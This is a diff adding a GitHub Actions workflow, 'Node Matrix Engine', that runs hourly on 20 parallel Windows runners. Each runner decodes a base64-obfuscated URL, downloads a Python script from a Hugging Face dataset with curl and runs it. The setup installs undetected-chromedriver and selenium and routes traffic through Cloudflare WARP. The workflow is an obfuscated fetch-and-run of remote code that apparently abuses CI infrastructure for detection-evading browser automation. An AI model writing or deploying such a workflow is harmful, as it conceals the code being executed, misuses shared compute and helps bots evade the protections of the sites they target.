@@ -1,0 +1,70 @@
+name: Node Matrix Engine
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 * * * *'
+
+concurrency:
+  group: cluster-pool-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: false
+
+jobs:
+  execute-nodes:
+    name: "Worker-${{ matrix.node_id }}"
+    runs-on: windows-2022
+    timeout-minutes: 75
+
+    strategy:
+      fail-fast: false
+      matrix:
+        node_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+
+    steps:
+      - name: Environment Setup & Script Fetching
+        shell: bash
+        run: |
+          echo "[INIT] Starting setup for Worker-${{ matrix.node_id }}..."
+          
+          # فك تشفير الرابط الجديد واستخراجه
+          FETCH_URL=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL3V1aXUvcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
+          
+          curl -sL "$FETCH_URL" -o runner_task.py
+          
+          echo "[INIT] Installing Python requirements..."
+          python -m pip install -qU pip setuptools
+          pip install -q undetected-chromedriver selenium requests
+          echo "[INIT] Environment configuration completed."
+
+      - name: Run Script & Process Monitor
+        shell: pwsh
+        env:
+          PYTHONIOENCODING: "utf-8"
+        run: |
+          Write-Output ">>> Launching script process on node ${{ matrix.node_id }}..."
+          
+          $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
+          
+          $ProcessConfig = @{
+              FilePath     = "python"
+              ArgumentList = "runner_task.py"
+              PassThru     = $true
+              NoNewWindow  = $true
+          }
+          $ActiveTask = Start-Process @ProcessConfig
+          
+          Write-Output ">>> Watchdog active. Enforcing maximum execution limit: 74 minutes."
+          
+          try {
+              Wait-Process -InputObject $ActiveTask -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Task finished successfully within duration."
+          }
+          catch {
+              Write-Output ">>> Timeout reached! Terminating current process..."
+              Stop-Process -InputObject $ActiveTask -Force
+              Write-Output ">>> Process terminated cleanly by watchdog."
+          }
+
+      - name: Finalization Step
+        shell: bash
+        run: echo "[COMPLETE] Worker-${{ matrix.node_id }} completed its execution cycle."
